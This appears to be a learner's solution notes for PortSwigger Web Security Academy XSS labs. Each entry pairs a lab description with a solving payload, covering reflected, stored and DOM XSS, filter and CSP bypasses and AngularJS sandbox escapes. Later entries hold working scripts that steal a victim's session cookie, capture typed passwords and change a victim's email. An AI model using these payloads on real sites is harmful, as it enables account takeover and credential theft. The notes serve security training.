```
Lab: Reflected XSS into HTML context with nothing encoded

APPRENTICE

This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the alert function. 
```

Crafted payload : 
```javascript
<script>alert(1)</script>
```
---
```
Lab: Stored XSS into HTML context with nothing encoded

APPRENTICE

This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the alert function when the blog post is viewed. 
```

Crafted payload : 
```javascript
<script>alert(1)</script>
```
---
```
Lab: DOM XSS in document.write sink using source location.search

APPRENTICE

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the alert function.  
```

Crafted payload : 
```javascript
"><img src=x onerror=alert(1)>
```
---
```
Lab: DOM XSS in innerHTML sink using source location.search

APPRENTICE

This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.

To solve this lab, perform a cross-site scripting attack that calls the alert function. 
```

Crafted payload : 
```javascript
"><img src=x onerror=alert(1)>
```
---
```
Lab: DOM XSS in jQuery anchor href attribute sink using location.search source

APPRENTICE

This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.

To solve this lab, make the "back" link alert document.cookie. 
```

Crafted payload : 
```javascript
javascript:alert(document.cookie)
```
---
```
Lab: DOM XSS in jQuery selector sink using a hashchange event

APPRENTICE

This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.

To solve the lab, deliver an exploit to the victim that calls the print() function in their browser. 
```

Crafted payload : 
```javascript
<iframe src="https://0ae6003603996bac8041626c00d40012.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
---
```
Lab: Reflected XSS into attribute with angle brackets HTML-encoded

APPRENTICE

This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function. 
```

Crafted payload : 
```javascript
" onmouseover="alert(1)"
```
---
```
Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded

APPRENTICE

This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked. 
```

Crafted payload : 
```javascript
javascript:alert(1)
```
---
```
Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded

APPRENTICE

This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked. 
```

Crafted payload : 
```javascript
test';alert(1);var test = 'test
```
---
```
Lab: DOM XSS in document.write sink using source location.search inside a select element

PRACTITIONER

This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function. 
```

Crafted payload : 
```javascript
storeId=<script>alert(1);</script>
```
---
```
Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

PRACTITIONER

This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.

AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.

To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function. 
```
Wappalyzer :

AngularJS 1.7.7

Crafted payload : 
```javascript
{{$on.constructor('alert(1)')()}}
```
---
```
Lab: Reflected DOM XSS

PRACTITIONER

This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

To solve this lab, create an injection that calls the alert() function. 
```

Crafted payload : 
```javascript
test\"-alert(1)}//
```
---
```
Lab: Stored DOM XSS

PRACTITIONER

This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the alert() function. 
```

```javascript
let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
firstPElement.innerHTML = newInnerHtml
```
Crafted payload : 
```javascript
<><img src=x onerror=alert(1)>
```
---
```
Lab: Reflected XSS into HTML context with most tags and attributes blocked

PRACTITIONER

This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.

To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function. 
```

Crafted payload : 
```javascript
<iframe src='https://0ad600fd03f931a380e11206003e001c.web-security-academy.net/?search=<body onresize=print()>' onload=this.style.width='12px'>
```
---
```
Lab: Reflected XSS into HTML context with all tags blocked except custom ones

PRACTITIONER

This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.
```

Crafted payload : 
```javascript
<script>
document.location='https://0a76006403c9e2df81abed0a00650048.web-security-academy.net/?search=%3Cxss+autofocus+tabindex%3D1+onfocus%3Dalert%28document.cookie%29%3E%3C%2Fxss%3E'
</script>
```
---
```
Lab: Reflected XSS with some SVG markup allowed

PRACTITIONER

This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.

To solve the lab, perform a cross-site scripting attack that calls the alert() function. 
```

Crafted payload : 
```javascript
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

---
```
Lab: Reflected XSS in canonical link tag

PRACTITIONER

This lab reflects user input in a canonical link tag and escapes angle brackets.

To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.

To assist with your exploit, you can assume that the simulated user will press the following key combinations:

    ALT+SHIFT+X
    CTRL+ALT+X
    Alt+X

Please note that the intended solution to this lab is only possible in Chrome. 
```
(Solved with the solution bc i don't understand this lab)
Crafted payload : 
```javascript
%27accesskey=%27x%27onclick=%27alert(1)
```
---
```
Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

PRACTITIONER

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. 
```
Crafted payload : 
```javascript
</script><script>alert(1)</script>
```

---
```
Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

PRACTITIONER

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. 
```
Crafted payload : 
```javascript
test\';alert(1);//
```
---
```
Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

PRACTITIONER

This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.  
```
Crafted payload : (Solution used because I was able to trigger the XSS but the lab didn't wanted to be solved)
```javascript
http://test?&apos;-alert(1)-&apos;
```
---
```
Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

PRACTITIONER

This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the alert function inside the template string.  
```
https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#template-literals

Crafted payload : 
```javascript
${alert(1)}
```
---
```
Lab: Exploiting cross-site scripting to steal cookies

PRACTITIONER

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim. 
```
Crafted payload (Without Burp Collaborator): 
```javascript
<script>
fetch('/post?postId=5')
  .then(response => response.text())
  .then(data => {
    var token = data.match(/name="csrf" value="(\w+)"/)[1];
    return fetch('/post/comment', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: `csrf=${token}&postId=5&comment=${document.cookie}&name=test&email=test%40test.fr&website=http%3A%2F%2Ftest`
    });
  });
</script>
```
---
```
Lab: Exploiting cross-site scripting to capture passwords

PRACTITIONER

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account. 
```
https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#auto-fill-passwords-capture

Crafted payload (Without Burp Collaborator) : 

```javascript
<b>Username:</b><br>
<input name="username" id="username">
<b>Password:</b><br>
<input type="password" name="password" onchange="sendCredentials()">
<script>
function sendCredentials() {
  var username = document.getElementById('username').value;
  var password = document.getElementsByName('password')[0].value;

  fetch('/post?postId=5')
    .then(response => response.text())
    .then(data => {
      var token = data.match(/name="csrf" value="(\w+)"/)[1];
      return fetch('/post/comment', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `csrf=${token}&postId=5&comment=username=${encodeURIComponent(username)}password=${encodeURIComponent(password)}&name=test&email=test%40test.fr&website=http%3A%2F%2Ftest`
      });
    })
    .then(response => {
      console.log('Requête POST terminée avec succès');
    })
    .catch(error => {
      console.error('Une erreur s\'est produite:', error);
    });
}

</script>
```
---
```
Lab: Exploiting XSS to perform CSRF

PRACTITIONER

This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: wiener:peter 
```

Crafted payload : 
```javascript
<script>
fetch('/my-account')
.then(response => response.text())
.then(data => {
    var token = data.match(/name="csrf" value="(\w+)"/)[1];
    return fetch('/my-account/change-email', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: `csrf=${token}&email=newmail%40normal-user.net`
    });
});
</script>
```
---
```
Lab: Reflected XSS with AngularJS sandbox escape without strings

EXPERT

This lab uses AngularJS in an unusual way where the $eval function is not available and you will be unable to use any strings in AngularJS.

To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the alert function without using the $eval function.  
```
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#client-side-template-injection

1.4.4 (without strings)

Gareth Heyes (PortSwigger)

Crafted payload : 
```javascript
test&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```
---
```
Lab: Reflected XSS with AngularJS sandbox escape and CSP

EXPERT

This lab uses CSP and AngularJS.

To solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts document.cookie. 
```
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#client-side-template-injection

All versions (all browsers) shorter using assignment

Gareth Heyes (PortSwigger) 

Crafted payload : 
```javascript
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>
```
---
```
Lab: Reflected XSS with event handlers and href attributes blocked

EXPERT

This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked..

To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function.

Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example:
<a href="">Click me</a>
```

Crafted payload : 
```javascript

```
---
```
Lab: Reflected XSS protected by CSP, with CSP bypass

EXPERT

This lab uses CSP and contains a reflected XSS vulnerability.

To solve the lab, perform a cross-site scripting attack that bypasses the CSP and calls the alert function.

Please note that the intended solution to this lab is only possible in Chrome.
```

https://portswigger.net/research/bypassing-csp-with-policy-injection

https://csp-evaluator.withgoogle.com/

Crafted payload : 
```javascript
<script>alert(1)<%2Fscript>&token=;script-src-elem 'unsafe-inline'
```
